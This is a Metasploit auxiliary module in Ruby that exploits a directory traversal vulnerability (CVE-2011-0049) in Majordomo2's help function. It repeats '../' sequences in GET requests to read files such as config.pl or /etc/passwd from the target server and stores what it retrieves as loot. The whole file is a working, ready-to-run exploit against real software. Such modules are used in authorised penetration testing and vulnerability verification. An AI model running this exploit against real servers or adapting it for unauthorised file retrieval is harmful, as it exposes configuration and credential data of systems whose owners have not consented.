##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Majordomo2 _list_file_get() Directory Traversal',
      'Description'    => %q{
          This module exploits a directory traversal vulnerability present in
        the _list_file_get() function of Majordomo2 (help function). By default, this
        module will attempt to download the Majordomo config.pl file.
      },
      'Author'         =>	['Nikolas Sotiriu'],
      'References'     =>
        [
          ['OSVDB', '70762'],
          ['CVE', '2011-0049'],
          ['CVE', '2011-0063'],
          ['URL', 'https://sitewat.ch/en/Advisory/View/1'],
          ['URL', 'http://sotiriu.de/adv/NSOADV-2011-003.txt'],
          ['EDB', '16103']
        ],
      'DisclosureDate' => 'Mar 08 2011',
      'License'        =>  MSF_LICENSE
    )

    register_options(
      [
        OptString.new('FILE', [ true,  "Define the remote file to view, ex:/etc/passwd", 'config.pl']),
        OptString.new('URI', [true, 'Majordomo vulnerable URI path', '/cgi-bin/mj_wwwusr/domain=domain?user=&passw=&func=help&extra=']),
        OptInt.new('DEPTH', [true, 'Define the max traversal depth', 8]),
      ], self.class)
  end

  def run_host(ip)
    trav_strings = [
      '../',
      './.../'
    ]
    uri  = normalize_uri(datastore['URI'])
    file = datastore['FILE']
    deep = datastore['DEPTH']
    file = file.gsub(/^\//, "")

    trav_strings.each do |trav|
      str = ""
      i   = 1
      while (i <= deep)
        str = trav * i
        payload = "#{str}#{file}"

        res = send_request_raw(
          {
            'method'  => 'GET',
            'uri'     => uri + payload,
          }, 25)

        if res.nil?
          print_error("#{rhost}:#{rport} Connection timed out")
          return
        end

        print_status("#{rhost}:#{rport} Trying URL " + payload )

        if (res and res.code == 200 and res.body)
          if res.body.match(/\<html\>(.*)\<\/html\>/im)
            html = $1

            if res.body =~ /unknowntopic/
              print_error("#{rhost}:#{rport} Could not retrieve the file")
            else
              file_data = html.gsub(%r{(.*)<pre>|<\/pre>(.*)}m, '')
              print_good("#{rhost}:#{rport} Successfully retrieved #{file} and storing as loot...")

              # Transform HTML entities back to the original characters
              file_data = file_data.gsub(/\&gt\;/i, '>').gsub(/\&lt\;/i, '<').gsub(/\&quot\;/i, '"')

              store_loot("majordomo2.traversal.file", "application/octet-stream", rhost, file_data, file)
              return
            end
          else
            print_error("#{rhost}:#{rport} No HTML was returned")
          end
        else
          # if res is nil, we hit this
          print_error("#{rhost}:#{rport} Unrecognized #{res.code} response")
        end
        i += 1;
      end
    end

    print_error("#{rhost}:#{rport} Not vulnerable or the DEPTH setting was too low")
  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
  rescue ::Timeout::Error, ::Errno::EPIPE
  end

end
